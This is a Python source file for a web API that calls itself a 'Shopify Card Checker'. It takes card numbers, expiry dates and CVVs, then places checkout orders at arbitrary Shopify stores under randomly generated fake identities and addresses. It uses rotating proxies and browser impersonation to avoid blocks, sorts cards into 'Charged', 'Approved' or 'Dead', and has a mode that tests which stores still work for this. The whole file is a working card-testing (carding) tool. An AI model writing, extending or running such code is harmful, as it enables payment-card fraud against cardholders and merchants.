"""
Shopify Card Checker API
High-performance async API with curl_cffi for maximum compatibility
"""

import asyncio
import json
import re
import random
import time
import os
from typing import Optional, Dict, Tuple
from urllib.parse import urlparse
from quart import Quart, request, jsonify
from curl_cffi.requests import AsyncSession
from queries import (
    QUERY_PROPOSAL_SHIPPING,
    QUERY_PROPOSAL_DELIVERY,
    MUTATION_SUBMIT,
    QUERY_POLL,
)

app = Quart(__name__)

# Constants
MIN_PRODUCT_PRICE = 1.0
DEFAULT_GATEWAY = "Shopify Payments"
MAX_CONCURRENT_REQUESTS = 5

# Currency to country mapping
C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

# Address book
book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

# Hard decline codes
HARD_DECLINES = frozenset({
    "CARD_DECLINED", "DO_NOT_HONOR", "EXPIRED_CARD", "INVALID_CARD",
    "STOLEN_CARD", "LOST_CARD", "RESTRICTED_CARD", "PICKUP_CARD",
    "INVALID_AMOUNT", "INVALID_ACCOUNT", "INVALID_CURRENCY",
    "TRANSACTION_NOT_ALLOWED", "SECURITY_VIOLATION", "BLOCKED",
    "CARD_NOT_SUPPORTED", "NOT_PERMITTED", "CALL_ISSUER", "FRAUD",
    "GENERIC_DECLINE", "DECLINED", "DECLINE", "INSUFFICIENT_FUNDS_DECLINE",
    "REVOCATION_OF_AUTHORIZATION", "REVOCATION_OF_ALL_AUTHORIZATIONS",
})

# Worker semaphore
worker_semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)


# ========== UTILITY FUNCTIONS ==========

def extract_between(text: str, start: str, end: str) -> Optional[str]:
    """Extract text between two markers"""
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                return parts[1].split(end, 1)[0]
    except Exception:
        pass
    return None


def capture(data: str, first: str, last: str) -> Optional[str]:
    """Capture text between markers"""
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


def pick_addr(url: str, cc: Optional[str] = None, rc: Optional[str] = None) -> dict:
    """Pick appropriate address based on URL and currency"""
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split(".")[-1].upper()

    if tcn in book:
        return book[tcn]

    ccn = C2C.get(cc)
    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]

    return book["DEFAULT"]


def generate_name() -> Tuple[str, str]:
    """Generate random name"""
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
    return random.choice(first_names), random.choice(last_names)


def generate_email(first: str, last: str) -> str:
    """Generate random email"""
    domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
    return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"


def parse_proxy_for_curl(proxy_str: Optional[str]) -> dict:
    """Parse proxy string for curl_cffi"""
    if not proxy_str:
        return {}

    if "://" in proxy_str:
        return {"http": proxy_str, "https": proxy_str}

    parts = proxy_str.split(":")
    if len(parts) == 2:
        url = f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        url = f"http://{user}:{password}@{ip}:{port}"
    else:
        return {}

    return {"http": url, "https": url}


def is_captcha_required(response_text: str) -> bool:
    """Check if CAPTCHA is required"""
    if not response_text:
        return False

    indicators = [
        "CAPTCHA_REQUIRED",
        '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"',
        "captcha required",
        "CAPTCHA CHALLENGE",
        "hcaptcha",
        "h-captcha",
    ]

    text_upper = response_text.upper()
    return any(indicator.upper() in text_upper for indicator in indicators)


def map_response(success: bool, raw_response: str) -> Tuple[bool, str]:
    """Map raw checkout result to simplified Status/Response"""
    raw_upper = (raw_response or "").upper().strip()

    if raw_upper == "ORDER_PLACED":
        return True, "Charged"

    if not success:
        return False, "Dead"

    for code in HARD_DECLINES:
        if code in raw_upper:
            return False, "Dead"

    return True, "Approved"


# ========== SHOPIFY CHECKOUT LOGIC ==========

async def fetch_products(session: AsyncSession, url: str, max_price: Optional[float] = None) -> dict:
    """Fetch products from Shopify store"""
    try:
        products_url = f"{url.rstrip('/')}/products.json?limit=250"

        resp = await session.get(products_url, timeout=15)
        if resp.status_code != 200:
            return {"error": "FAILED_TO_FETCH_PRODUCTS"}

        data = resp.json()
        products = data.get('products', [])

        if not products:
            return {"error": "NO_PRODUCTS"}

        # Filter by price
        valid_variants = []

        for product in products:
            if not product.get('available') or not product.get('variants'):
                continue

            for variant in product['variants']:
                if not variant.get('available'):
                    continue

                try:
                    price = float(variant.get('price', 0))
                    if price < MIN_PRODUCT_PRICE:
                        continue

                    if max_price and price > max_price:
                        continue

                    valid_variants.append({
                        'product_id': product['id'],
                        'variant_id': variant['id'],
                        'price': price,
                        'title': product.get('title', 'Product')
                    })
                except (ValueError, TypeError):
                    continue

        if not valid_variants:
            return {"error": "NO_PRODUCT_IN_PRICE_RANGE"}

        # Return cheapest variant
        cheapest = min(valid_variants, key=lambda x: x['price'])

        return {
            'product_id': cheapest['product_id'],
            'variant_id': cheapest['variant_id'],
            'price': cheapest['price'],
            'title': cheapest['title']
        }

    except Exception as e:
        return {"error": f"PRODUCT_FETCH_ERROR: {str(e)}"}


async def perform_checkout(
    session: AsyncSession,
    url: str,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    product_info: dict
) -> dict:
    """Perform full Shopify checkout flow"""

    try:
        # Generate random identity
        first_name, last_name = generate_name()
        email = generate_email(first_name, last_name)

        # Get base URL
        base_url = url.rstrip('/')

        # Step 1: Create cart
        cart_url = f"{base_url}/cart/add.js"
        cart_data = {
            'id': product_info['variant_id'],
            'quantity': 1
        }

        resp = await session.post(cart_url, json=cart_data, timeout=15)
        if resp.status_code >= 400:
            return {"error": "FAILED_TO_ADD_TO_CART", "Status": False}

        # Step 2: Get checkout URL
        checkout_url = f"{base_url}/checkout.json"

        # Get currency from page
        resp = await session.get(base_url, timeout=15)
        page_html = resp.text

        currency_match = re.search(r'"currency":\s*"([A-Z]{3})"', page_html)
        currency = currency_match.group(1) if currency_match else "USD"

        # Pick address
        addr = pick_addr(url, currency)

        # Step 3: Create checkout session
        session_token = None
        graphql_url = f"{base_url}/api/2024-01/graphql.json"

        # Build checkout variables
        variables = {
            "sessionInput": {
                "buyer": {
                    "email": email,
                    "firstName": first_name,
                    "lastName": last_name
                },
                "lineItems": [{
                    "variantId": f"gid://shopify/ProductVariant/{product_info['variant_id']}",
                    "quantity": 1
                }]
            },
            "buyerIdentity": {
                "email": email,
                "firstName": first_name,
                "lastName": last_name,
                "phone": addr['phone']
            },
            "delivery": {
                "address": {
                    "address1": addr['address1'],
                    "city": addr['city'],
                    "countryCode": addr['countryCode'],
                    "zoneCode": addr['zoneCode'],
                    "postalCode": addr['postalCode'],
                    "firstName": first_name,
                    "lastName": last_name,
                    "phone": addr['phone']
                }
            },
            "merchandise": {
                "lines": [{
                    "variantId": f"gid://shopify/ProductVariant/{product_info['variant_id']}",
                    "quantity": 1
                }]
            }
        }

        # Step 4: Query proposal (shipping)
        payload = {
            "query": QUERY_PROPOSAL_SHIPPING,
            "variables": variables
        }

        resp = await session.post(graphql_url, json=payload, timeout=30)

        if resp.status_code >= 400:
            return {"error": "GRAPHQL_ERROR", "Status": False}

        result = resp.json()

        # Check for CAPTCHA
        if is_captcha_required(resp.text):
            return {"error": "CAPTCHA_REQUIRED", "Status": False}

        # Extract session data
        try:
            negotiate = result['data']['session']['negotiate']
            seller_proposal = negotiate['result']['sellerProposal']

            # Get total price
            total = seller_proposal.get('total', {}).get('value', {}).get('amount', product_info['price'])
            order_total = float(total)

        except (KeyError, TypeError):
            return {"error": "FAILED_TO_PARSE_PROPOSAL", "Status": False}

        # Step 5: Tokenize payment
        # Format: 2025-12 for expiry
        expiry = f"20{yy}-{mm.zfill(2)}"

        payment_data = {
            "credit_card": {
                "number": cc,
                "name": f"{first_name} {last_name}",
                "month": int(mm),
                "year": int(f"20{yy}"),
                "verification_value": cvv
            }
        }

        vault_url = f"{base_url}/api/2024-01/payment_vault/token"

        resp = await session.post(vault_url, json=payment_data, timeout=15)

        if resp.status_code >= 400:
            return {"error": "PAYMENT_TOKENIZATION_FAILED", "Status": False}

        token_data = resp.json()
        payment_token = token_data.get('token')

        if not payment_token:
            return {"error": "NO_PAYMENT_TOKEN", "Status": False}

        # Step 6: Submit order
        variables['payment'] = {
            "paymentMethod": {
                "token": payment_token,
                "type": "CREDIT_CARD"
            }
        }

        submit_payload = {
            "query": MUTATION_SUBMIT,
            "variables": variables
        }

        resp = await session.post(graphql_url, json=submit_payload, timeout=30)

        if resp.status_code >= 400:
            return {"error": "SUBMISSION_FAILED", "Status": False}

        submit_result = resp.json()

        # Check for CAPTCHA again
        if is_captcha_required(resp.text):
            return {"error": "CAPTCHA_REQUIRED", "Status": False}

        # Step 7: Poll for result
        poll_payload = {
            "query": QUERY_POLL,
            "variables": variables
        }

        max_polls = 5
        for _ in range(max_polls):
            await asyncio.sleep(2)

            resp = await session.post(graphql_url, json=poll_payload, timeout=30)

            if resp.status_code >= 400:
                continue

            poll_result = resp.json()

            try:
                status = poll_result['data']['session']['status']

                if status == 'COMPLETE':
                    # Success - order placed
                    return {
                        "Status": True,
                        "Response": "Charged",
                        "Gateway": DEFAULT_GATEWAY,
                        "product_price": product_info['price'],
                        "order_total": order_total,
                        "raw_response": "ORDER_PLACED"
                    }

                elif status in ['FAILED', 'DECLINED']:
                    # Get error message
                    errors = poll_result.get('errors', [])
                    error_msg = errors[0].get('message', 'DECLINED') if errors else 'DECLINED'

                    success, response = map_response(False, error_msg)

                    return {
                        "Status": success,
                        "Response": response,
                        "Gateway": DEFAULT_GATEWAY,
                        "product_price": product_info['price'],
                        "order_total": order_total,
                        "raw_response": error_msg
                    }

            except (KeyError, TypeError):
                pass

        # Timeout
        return {
            "Status": False,
            "Response": "Timeout",
            "Gateway": DEFAULT_GATEWAY,
            "product_price": product_info['price'],
            "order_total": order_total,
            "raw_response": "POLL_TIMEOUT"
        }

    except Exception as e:
        return {"error": f"CHECKOUT_ERROR: {str(e)}", "Status": False}


# ========== API ENDPOINTS ==========

@app.route('/health', methods=['GET'])
async def health():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "workers": MAX_CONCURRENT_REQUESTS})


@app.route('/workers', methods=['GET'])
async def workers():
    """Get worker status"""
    active = MAX_CONCURRENT_REQUESTS - worker_semaphore._value
    return jsonify({
        "total": MAX_CONCURRENT_REQUESTS,
        "active": active,
        "available": worker_semaphore._value
    })


@app.route('/product_price', methods=['GET'])
async def product_price():
    """Get cheapest product price for a site"""
    try:
        url = request.args.get('url')
        max_price = request.args.get('max_price')

        if not url:
            return jsonify({"error": "URL_REQUIRED"}), 400

        max_price_float = None
        if max_price:
            try:
                max_price_float = float(max_price)
            except ValueError:
                pass

        proxy_str = request.args.get('proxy')
        proxies = parse_proxy_for_curl(proxy_str)

        async with worker_semaphore:
            async with AsyncSession(impersonate="chrome120", proxies=proxies) as session:
                product_info = await fetch_products(session, url, max_price_float)

                if 'error' in product_info:
                    return jsonify(product_info), 200

                return jsonify({
                    "price": product_info['price'],
                    "product_id": product_info['product_id'],
                    "variant_id": product_info['variant_id'],
                    "title": product_info['title']
                })

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/products', methods=['GET'])
async def products():
    """Get all products from a site"""
    try:
        url = request.args.get('url')

        if not url:
            return jsonify({"error": "URL_REQUIRED"}), 400

        proxy_str = request.args.get('proxy')
        proxies = parse_proxy_for_curl(proxy_str)

        async with worker_semaphore:
            async with AsyncSession(impersonate="chrome120", proxies=proxies) as session:
                products_url = f"{url.rstrip('/')}/products.json?limit=250"

                resp = await session.get(products_url, timeout=15)

                if resp.status_code != 200:
                    return jsonify({"error": "FAILED_TO_FETCH"}), resp.status_code

                return jsonify(resp.json())

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/shopify', methods=['GET'])
async def shopify():
    """Main Shopify checkout endpoint"""
    try:
        # Get parameters
        url = request.args.get('url')
        cc = request.args.get('cc')
        mm = request.args.get('mm')
        yy = request.args.get('yy')
        cvv = request.args.get('cvv')
        max_price = request.args.get('max_price')
        test_mode = request.args.get('test', '').lower() == 'true'

        # Validate
        if not url:
            return jsonify({"error": "URL_REQUIRED"}), 400

        if not test_mode and (not cc or not mm or not yy or not cvv):
            return jsonify({"error": "CARD_DETAILS_REQUIRED"}), 400

        max_price_float = None
        if max_price:
            try:
                max_price_float = float(max_price)
            except ValueError:
                pass

        proxy_str = request.args.get('proxy')
        proxies = parse_proxy_for_curl(proxy_str)

        async with worker_semaphore:
            async with AsyncSession(impersonate="chrome120", proxies=proxies) as session:
                # Fetch products
                product_info = await fetch_products(session, url, max_price_float)

                if 'error' in product_info:
                    # For site testing, any non-fatal error means site is dead
                    if test_mode:
                        if product_info['error'] in ['CAPTCHA_REQUIRED', 'NO_PRODUCTS', 'FAILED_TO_FETCH_PRODUCTS']:
                            return jsonify({"Status": False, "error": product_info['error']})
                        else:
                            # NO_PRODUCT_IN_PRICE_RANGE means site is alive, just no matching products
                            return jsonify({"Status": True, "info": product_info['error']})

                    return jsonify(product_info), 200

                # If test mode, site is working
                if test_mode:
                    return jsonify({
                        "Status": True,
                        "price": product_info['price'],
                        "info": "SITE_WORKING"
                    })

                # Perform checkout
                result = await perform_checkout(session, url, cc, mm, yy, cvv, product_info)

                # For site testing: any response that shows the site processed the card means it's working
                # Only CAPTCHA, timeouts, and connection errors mean site is dead
                if test_mode:
                    if result.get('error') in ['CAPTCHA_REQUIRED', 'TIMEOUT', 'CONNECTION_ERROR']:
                        result['Status'] = False
                    else:
                        result['Status'] = True

                return jsonify(result)

    except Exception as e:
        return jsonify({"error": str(e), "Status": False}), 500


# ========== MAIN ==========

if __name__ == '__main__':
    import sys

    workers = int(os.getenv('WORKERS', '6'))
    port = int(os.getenv('PORT', '5000'))
    host = os.getenv('HOST', '0.0.0.0')

    print(f"🚀 Starting Shopify Checker API on {host}:{port} with {workers} workers")

    # Use hypercorn for production
    from hypercorn.config import Config
    from hypercorn.asyncio import serve

    config = Config()
    config.bind = [f"{host}:{port}"]
    config.workers = workers

    asyncio.run(serve(app, config))
